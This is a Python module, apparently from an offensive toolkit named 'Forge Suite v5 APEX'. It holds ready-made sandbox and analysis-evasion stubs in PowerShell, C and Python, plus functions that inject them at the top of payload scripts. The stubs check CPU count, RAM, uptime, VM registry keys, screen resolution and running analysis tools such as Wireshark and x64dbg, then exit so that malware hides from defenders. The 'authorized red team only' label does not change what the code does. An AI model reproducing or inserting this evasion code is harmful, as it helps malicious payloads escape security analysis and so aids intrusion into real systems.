"""Sandbox and analysis environment detection.

Techniques that run before payload execution to abort in sandboxes:
    1. CPU core count (sandboxes often have 1-2 cores)
    2. Total RAM (sandboxes often have < 2GB)
    3. Uptime check (sandboxes revert snapshots → low uptime)
    4. Known analysis process names (Wireshark, ProcMon, x64dbg, etc.)
    5. VM artifact detection (registry keys, firmware strings)
    6. Timing attacks (CPUID / RDTSC delta — VM exits are slow)
    7. User interaction check (mouse movement, recent UI activity)
    8. Domain-joined check (sandboxes are rarely domain-joined)
    9. Screen resolution (sandboxes often 1024x768)
    10. Recent file access (sandboxes look fresh)

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations


_PS1_SANDBOX_FULL = r"""
# Forge Suite v5 APEX — Sandbox Detection
# FOR AUTHORIZED RED TEAM OPERATIONS ONLY
Function SandboxCheck {
    # 1. CPU core count
    if ([System.Environment]::ProcessorCount -lt 2) { return $true }

    # 2. RAM check (< 2GB)
    try {
        $mem = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory
        if ($mem -lt 2147483648) { return $true }
    } catch {}

    # 3. Uptime (< 12 minutes → fresh snapshot)
    try {
        $boot = (Get-WmiObject Win32_OperatingSystem).LastBootUpTime
        $uptime = (Get-Date) - [System.Management.ManagementDateTimeConverter]::ToDateTime($boot)
        if ($uptime.TotalMinutes -lt 12) { Start-Sleep -Seconds 15 }
    } catch {}

    # 4. Known analysis tools
    $procs = Get-Process | Select-Object -ExpandProperty Name | ForEach-Object { $_.ToLower() }
    $tools = @('wireshark','fiddler','processhacker','procmon','procexp','x64dbg',
                'windbg','ollydbg','ida64','idaq','idaq64','autoruns','tcpview',
                'sysinspector','de4dot','ilspy','reflector','vboxservice','vmtoolsd')
    foreach ($t in $tools) {
        if ($procs -contains $t) { return $true }
    }

    # 5. VM registry artifacts
    $vmKeys = @(
        'HKLM:\SOFTWARE\VMware, Inc.\VMware Tools',
        'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions',
        'HKLM:\SYSTEM\CurrentControlSet\Services\VBoxSF',
        'HKLM:\HARDWARE\ACPI\DSDT\VBOX__'
    )
    foreach ($k in $vmKeys) {
        if (Test-Path $k) { return $true }
    }

    # 6. Screen resolution check (sandboxes often run 1024x768)
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        if ($screen.Width -le 1024 -and $screen.Height -le 768) { return $true }
    } catch {}

    # 7. Domain check
    try {
        $domain = (Get-WmiObject Win32_ComputerSystem).Domain
        if ($domain -eq 'WORKGROUP') {
            # Not domain-joined — check user count instead
            $users = (Get-LocalUser | Where-Object Enabled -eq $true).Count
            if ($users -lt 2) { return $true }
        }
    } catch {}

    return $false
}

if (SandboxCheck) { exit 0 }
"""

_PS1_SANDBOX_LIGHTWEIGHT = r"""
# Sandbox detection (lightweight)
if ([System.Environment]::ProcessorCount -lt 2) { exit 0 }
try {
    $m=(Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory
    if($m -lt 2147483648){ exit 0 }
} catch {}
$p=Get-Process|Select -Expand Name|%{$_.ToLower()}
@('wireshark','x64dbg','procmon','fiddler')|%{if($p -contains $_){exit 0}}
"""

_C_SANDBOX_STUB = r"""
// Forge Suite v5 APEX — Sandbox Detection Stub (C)
#include <windows.h>
#include <tlhelp32.h>

static const char *g_analysis_tools[] = {
    "wireshark.exe", "fiddler.exe", "x64dbg.exe", "windbg.exe",
    "procmon.exe", "procmon64.exe", "processhacker.exe", "ollydbg.exe",
    "idaq.exe", "idaq64.exe", "autoruns.exe", "tcpview.exe",
    NULL
};

BOOL sandbox_check(void) {
    // CPU cores
    SYSTEM_INFO si = {0};
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;

    // RAM
    MEMORYSTATUSEX ms = {0};
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;

    // Analysis processes
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {0};
        pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                for (int i = 0; g_analysis_tools[i]; i++) {
                    if (_stricmp(pe.szExeFile, g_analysis_tools[i]) == 0) {
                        CloseHandle(snap);
                        return TRUE;
                    }
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    return FALSE;
}
// Usage: if (sandbox_check()) ExitProcess(0);
"""

_PYTHON_SANDBOX_STUB = """\
import ctypes, os, sys, platform, subprocess, time

def sandbox_check():
    # CPU cores
    if os.cpu_count() < 2:
        return True
    # RAM (Linux)
    try:
        with open('/proc/meminfo') as f:
            for line in f:
                if 'MemTotal' in line:
                    kb = int(line.split()[1])
                    if kb < 2 * 1024 * 1024:
                        return True
                    break
    except Exception:
        pass
    # Uptime
    try:
        with open('/proc/uptime') as f:
            uptime = float(f.read().split()[0])
            if uptime < 300:
                time.sleep(15)
    except Exception:
        pass
    return False

if sandbox_check():
    sys.exit(0)
"""


def inject_sandbox_check(script: str, lang: str = "ps1", lightweight: bool = False) -> str:
    """Inject sandbox detection code at the top of a script.

    Args:
        script:      Script text to prepend to.
        lang:        Script language ('ps1', 'python', 'c').
        lightweight: Use lighter check (faster, slightly less thorough).

    Returns:
        Script with sandbox check prepended.
    """
    if lang == "ps1":
        stub = _PS1_SANDBOX_LIGHTWEIGHT if lightweight else _PS1_SANDBOX_FULL
    elif lang == "python":
        stub = _PYTHON_SANDBOX_STUB
    elif lang == "c":
        stub = _C_SANDBOX_STUB
    else:
        return script

    return stub + "\n" + script


def get_sandbox_stub(lang: str, lightweight: bool = False) -> str:
    """Return sandbox detection stub for a given language.

    Args:
        lang:        Language ('ps1', 'python', 'c').
        lightweight: Use lighter check.

    Returns:
        Sandbox detection code string.
    """
    if lang == "ps1":
        return _PS1_SANDBOX_LIGHTWEIGHT if lightweight else _PS1_SANDBOX_FULL
    elif lang == "python":
        return _PYTHON_SANDBOX_STUB
    elif lang == "c":
        return _C_SANDBOX_STUB
    return ""
